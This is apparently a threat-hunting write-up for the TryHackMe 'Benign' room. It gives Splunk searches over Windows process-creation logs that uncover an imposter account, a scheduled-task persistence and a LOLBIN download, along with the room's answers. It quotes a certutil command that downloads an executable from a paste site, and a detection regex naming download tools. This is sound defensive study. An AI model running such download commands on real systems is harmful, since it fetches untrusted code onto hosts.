# Splunk Query Cookbook — TryHackMe *Benign*

All searches target the room's index: **`win_eventlogs`** (Windows Security
event log, **Event ID 4688** — process creation only).

Time range for every search: **1 March 2022 00:00 → 31 March 2022 23:59**
(set with the search bar's date-range picker, or `earliest=03/01/2022:00:00:00
latest=03/31/2022:23:59:59`).

---

## 1. How much data do we have? — Answer: `13959`

```spl
index=win_eventlogs
| stats count AS total_events
```

*Scope first.* Know the size and date coverage of the dataset before drawing
conclusions from it.

---

## 2. Who is in the data? — imposter: `Amel1a`

The interesting-fields panel shows `Top 10 values` for `UserName`, which hides
the 11th account. Force every value out:

```spl
index=win_eventlogs
| stats count AS events BY UserName
| sort +events
```

Rare-value approach (useful when the anomaly is low-volume rather than unseen):

```spl
index=win_eventlogs
| rare limit=20 UserName
```

De-duplicated list, one row per user:

```spl
index=win_eventlogs
| dedup UserName
| table UserName
```

Then pivot on the suspicious account:

```spl
index=win_eventlogs UserName=Amel1a
| table _time UserName HostName ProcessName CommandLine
```

→ one event: a `whoami.exe` process creation.

> **Gotcha:** `Amel1a` is the **11th** value. A `top`-style view that caps at 10
> rows would have hidden the imposter completely — a good reminder to always
> verify that your aggregation is not silently truncating results.

---

## 3. Scheduled tasks in HR — user: `Chris.fort`

`schtasks.exe` is the built-in binary used to create/query scheduled tasks
(the corresponding *event* for a created task is **4698**).

```spl
index=win_eventlogs ProcessName="*schtasks.exe"
| table _time UserName HostName ProcessName CommandLine
```

Restricted to the HR department and the event that matters:

```spl
index=win_eventlogs UserName IN (haroon, "Chris.fort", diana, daina)
| search ProcessName="*schtasks.exe" CommandLine="*create*"
| table _time UserName HostName CommandLine
```

→ task created by **Chris.fort** that runs `update.exe` from a `\Temp\`
directory at startup — persistence disguised as an "Office update".

---

## 4. LOLBIN download in HR — user: `haroon`, binary: `certutil.exe`

### 4a. Find URL-bearing command lines among HR staff

```spl
index=win_eventlogs UserName IN (haroon, "Chris.fort", diana, daina) CommandLine="*http*"
| table _time UserName HostName ProcessName CommandLine
```

### 4b. Hunt known download-capable LOLBINs

```spl
index=win_eventlogs UserName IN (haroon, "Chris.fort", diana, daina)
| regex CommandLine="(?i)(-urlcache|-download|-split|-enc|invoke-webrequest|iwr|curl|wget)"
| table _time UserName HostName ProcessName CommandLine
```

### 4c. Pin down certutil specifically

```spl
index=win_eventlogs ProcessName="*certutil.exe"
| table _time UserName HostName ProcessName CommandLine
```

→ single event, user **haroon**, command line:

```text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

Event time: **2022-03-04**.

### 4d. The same event, read as a time-anchored timeline

```spl
index=win_eventlogs ProcessName="*certutil.exe"
| table _time UserName HostName ProcessName CommandLine
| sort +_time
```

---

## 5. Operator cheat-sheet used in this room

| Operator / syntax | Purpose |
| --- | --- |
| `index=win_eventlogs` | Select the data source |
| `UserName IN (a, b, c)` | Scope to a list of users (quote values containing `.`) |
| `"*schtasks.exe"` / `"*http*"` | Wildcard field matching |
| `\| stats count BY UserName` | Aggregate events per distinct value |
| `\| rare limit=20 UserName` | Surface low-frequency (anomalous) values |
| `\| dedup UserName` | One row per distinct value |
| `\| table field1 field2` | Show only the fields that matter |
| `\| regex CommandLine="(?i)(…)"` | Case-insensitive regex filtering on a field |
| `\| sort +_time` | Chronological ordering for timelines |

---

## 6. Follow-up hunts worth trying (beyond the room)

```spl
:: Any binary running out of a temp or user-writable path
index=win_eventlogs CommandLine="*\\Temp\\*" OR CommandLine="*\\AppData\\*"
| stats count BY UserName, ProcessName
```
```spl
:: PowerShell encoded commands (if PS logging exists in your environment)
index=win_eventlogs ProcessName="*powershell.exe" CommandLine="*-enc*"
| table _time UserName HostName CommandLine
```
```spl
:: Every process parented by a paste-site downloader, e.g. benign.exe
index=win_eventlogs ParentProcessName="*benign.exe"
| table _time UserName HostName ProcessName CommandLine
```

> In the room only 4688 exists, so parent-process pivots are limited — but in a
> real environment `ParentProcessName`, `ParentCommandLine` and network logs turn
> these single events into a full chain.
